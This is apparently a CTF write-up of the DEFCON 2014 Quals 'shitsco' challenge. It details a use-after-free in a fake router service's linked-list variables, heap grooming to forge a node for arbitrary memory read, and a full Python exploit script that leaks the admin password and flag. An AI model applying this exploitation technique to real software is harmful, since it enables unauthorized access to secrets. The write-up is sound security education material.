---
layout: post
title: "DEFCON 2014 Quals : shitsco"
description: ""
category: writeups 
tags:
- defconquals2014
- 2014
- defconquals
- gynophage
---
{% include JB/setup %}


### Description
    shitsco
    http://services.2014.shallweplayaga.me/shitsco_c8b1aa3167SIGINT9e945ee64bde1bdb19d035 is running at:

    shitsco_c8b1aa31679e945ee64bde1bdb19d035.2014.shallweplayaga.me:31337

    Capture the flag.

Basic binary service? Sure why not.

### Poking it with a stick


	 oooooooo8 oooo        o88    o8
	 888         888ooooo   oooo o888oo  oooooooo8    ooooooo     ooooooo
	 888oooooo  888   888   888  888   888ooooooo  888     888 888     888
	        888 888   888   888  888           888 888         888     888
	 o88oooo888 o888o o888o o888o  888o 88oooooo88    88ooo888    88ooo88

	Welcome to Shitsco Internet Operating System (IOS)
	For a command list, enter ?
	$ ?
	==========Available Commands==========
	|enable                               |
	|ping                                 |
	|tracert                              |
	|?                                    |
	|shell                                |
	|set                                  |
	|show                                 |
	|credits                              |
	|quit                                 |
	======================================
	Type ? followed by a command for more detailed information
	$ enable foo
	Nope.  The password isn't foo
	$


Weird fake cisco router thing. Notable looking commands, shell, set, show, enable.

1. shell is fake, prints "bash-3.2$" then laughs at you.
2. enable sure does take a password to enable admin access
3. set sets 'variables', show shows them

We started with enable, since sometimes you can get back more data than you send!


A bit later in IDA, we have some function names:
![Function Names](/assets/images/defconquals2014/shitsco_funcs.png)


Enable seems not too exciting, though it does appear to set an admin bit.
![enable graph](/assets/images/defconquals2014/shitsco_enable.png)

Notably, their read_input function doesn't properly null terminate strings, so sometimes we can get a few bytes of stack data out of the %s on printf. Unfortunately, this turns out to be completely worthless.

On to the other odd looking features of 'set' and 'show'.

Show does something like:

    if name != null
	  print find_value(name)
    else
	  node = head
	  while node.next!= null
		if node.name != null
		  print node

Where the node struct looks like:

    struct node{
	  char* name;
	  char* value;
	  struct node* next;
	  struct node* prev;
	}


### Getting an arbitrary read

Neat, so we can print out values, looking at set, it turns out we can also DELETE values:
![set delete path](/assets/images/defconquals2014/shitsco_set_delete.png)

I wonder what happens when we delete the statically allocated head of the list, while having 2 variables set?

    [head]
    (gdb) x /20x 0x804C36C
    0x804c36c:      0x00000000      0x00000000      0x0804d1c0      0x00000000

    [element 2]
    (gdb) x /20x 0x0804d1c0
    0x804d1c0:      0x0804d1d8      0x0804d1e8      0x00000000      0x00000000


Well, we obviously have to keep that next pointer set! Otherwise it could never traverse to other nodes in the list.

And if we delete the second element now?

    [head]
    (gdb) x /20x 0x804C36C
    0x804c36c:      0x00000000      0x00000000      0x0804d1c0      0x00000000

    [element 2]
    (gdb) x /20x 0x0804d1c0
    0x804d1c0:      0x00000000      0x00000000      0x00000000      0x00000000


Uh oh... that next pointer still looks pretty valid, and that 2nd element sure did get deleted.

Lets try allocating a new element to the head.

    [head]
    (gdb) x /20x 0x804C36C
    0x804c36c:      0x0804d1e8      0x0804d1a0      0x0804d1c0      0x00000000

Those name and value pointers sure do look close to our dangling invalid next ptr.

With a bit of heap feng shui (smart allocation ordering) lets see what we can do.

    set a bbb
	set bbbbbbbbbbbbbbbb s
	set a    [delete]
    set bbbbbbbbbbbbbbbb     [delete]
	set xxxxxxxxxxxxxxxx f


Allocate the first element normally, then allocate the 2nd element with a name of the exact same size as a struct_node, delete both. Then when we next try to create an element, we need a struct_node (head is available so it uses that) and the next allocation it tries will be for the name (xxx...) which if its the same size as struct_node, will happily take the free'd 2nd elements spot.

    [head]
    (gdb) x /20x 0x804C36C
    0x804c36c:      0x0804d1d8      0x0804d190      0x0804d1d8      0x00000000

Hey look, our name ptr goes directly to our next pointer!
Lets cook up a better name then, say one that has the same structure as a struct_node, and we can read that value whenever we want!


### Reading something

Well now that we have a read, lets go back to enable, and find something to read.
	.text:08049267                 mov     [esp+4Ch+buffer], ebx ; s2
	.text:0804926B                 mov     [esp+4Ch+stream], offset dword_804C3A0 ; s1
	.text:08049272                 call    _strcmp
	.text:08049277                 mov     [esp+4Ch+var_14], eax
	.text:0804927B                 mov     eax, [esp+4Ch+var_14]
	.text:0804927F                 test    eax, eax
	.text:08049281                 jz      short loc_80492B8
	.text:08049283                 mov     [esp+4Ch+max_length], ebx
	.text:08049287                 mov     [esp+4Ch+buffer], offset aNope_ThePasswo ; "Nope.  The password isn't %s\n"
	.text:0804928F                 mov     [esp+4Ch+stream], 1
	.text:08049296                 call    ___printf_chk

Oh... lets read 0x804C3A0.

So our name for our reallocated element is now going to need 2 things. A valid node.name and a valid node.value. Since we want to be able to look this element up by name, and we don't know 0x804C3A0 yet, lets have that be the value pointer, and go find a good name pointer.

	.rodata:080495BC _IO_stdin_used  dd 20001h
	.rodata:080495C0 ; char modes[2]
	.rodata:080495C0 modes           db 'r',0                ; DATA XREF: init_opening_pw_file+18
	.rodata:080495C0                                         ; cmd_flag+24
	.rodata:080495C2 ; char filename[]
	.rodata:080495C2 filename        db '/home/shitsco/password',0
	.rodata:080495C2                                         ; DATA XREF: init_opening_pw_file+20

'r' is a pretty good name, no spaces and we know where it is.

Our final name string is thus

    [ptr to 'r'][0x804C3A0][something][something]


### Script


    #!/usr/bin/python
	from sock import *
	import sys
	import time

	#host = "localhost:1111"
	host = "shitsco_c8b1aa31679e945ee64bde1bdb19d035.2014.shallweplayaga.me:31337"
	#con = Sock("localhost:1111")
	con = Sock(host)
	def go_interactive(con):
		while True:
			time.sleep(0.2)
			print con.read_one(0)
			con.write(sys.stdin.readline())


	def pause_script():
		raw_input("Paused... Press enter to continue")  

	namestr = "\xC0\x95\x04\x08"+"\xA0\xC3\x04\x08"*3
	valstr = "f"


	con.read_until('$')
	con.send_line("set a bbb")
	con.send_line("set "+'b'*16+" s")
	con.send_line("set a ")
	con.send_line("set "+'b'*16+" ")
	con.send_line("set "+namestr+" "+valstr)

	#go_interactive(con)

	con.read_one(0)

	con.send_line("show "+"r")
	data =  con.read_line()

	print data
	print [hex(ord(x)) for x in data]


Reading the password produces some password: bruT3m3hard3rb4by

Which we then use

	$ enable
	Please enter a password: bruT3m3hard3rb4by


and the (previously unlisted) flag command

    # flag
	The flag is: Dinosaur vaginas

... Not sure what that had to do with the problem, but its worth points
